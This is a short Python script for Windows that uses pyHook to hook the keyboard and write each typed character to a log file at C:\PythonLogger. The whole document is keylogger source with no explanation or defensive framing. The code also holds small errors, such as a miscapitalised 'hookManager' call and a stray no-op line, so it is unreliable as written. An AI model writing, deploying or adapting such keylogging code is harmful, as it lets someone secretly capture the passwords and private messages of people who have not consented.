import sys
import logging

try:
	import pyHook
	import pythoncom
except ImportError:
	print("The module %s couldn't be found" % (sys.exc_info()[1].message.split()[-1]))
	sys.exit(1)

file_log = 'C:\\PythonLogger'

def OnKeyboardEvent (event):
    logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
    chr(event.Ascii)
    logging.log(10,chr(event.Ascii))
    return True

hooks_manager = pyHook.hookManager()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()
